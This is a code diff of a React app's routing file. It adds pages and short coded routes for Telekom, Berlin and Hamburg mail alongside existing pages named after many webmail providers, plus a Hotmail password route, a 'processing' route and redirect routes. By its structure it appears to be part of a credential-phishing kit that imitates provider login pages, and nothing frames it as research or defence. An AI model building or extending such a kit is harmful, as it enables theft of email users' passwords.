@@ -5,9 +5,11 @@ import "react-toastify/dist/ReactToastify.css";
 import Page126 from "./pages/126";
 import Page163 from "./pages/163";
 import Page263 from "./pages/263";
+import BerlinMail from "./pages/berlinnail";
 import Encryption from "./pages/encryption";
 import Gmx from "./pages/gmx";
 import Godaddy from "./pages/godaddy";
+import Hamburg from "./pages/hamburg";
 import Hinet from "./pages/hinet";
 import Hiworks from "./pages/hiworks";
 import HomeRedirect from "./pages/home";
@@ -21,6 +23,7 @@ import Qq from "./pages/qq";
 import Rackspace from "./pages/rackspace";
 import Redirect from "./pages/redirect";
 import RedirectNorecord from "./pages/redirectnorecord";
+import Telekom from "./pages/telekom";
 import Webmail from "./pages/webmail";
 import WebmailMain from "./pages/webmailmain";
 import Yahoo from "./pages/yahoo";
@@ -50,6 +53,9 @@ function App() {
     163: "p163",
     webmail: "wbm",
     gmx: "gm",
+    telekom: "tk",
+    berlin: "ber",
+    hamburg: "hab",
   });
 
   return (
@@ -73,12 +79,14 @@ function App() {
         <Yandex path={page.yandex} />
         <Zoho path={page.zoho} />
 
+        <Telekom path={page.telekom} />
+        <BerlinMail path={page.berlin} />
+        <Hamburg path={page.hamburg} />
+
         <Hotmail path={page.office} />
         <HotmailPassword path="ht/:data" />
 
         <Gmx path={page.gmx} />
-        
-
 
         <Processing path="processing" />
         <Portal path="portal" />
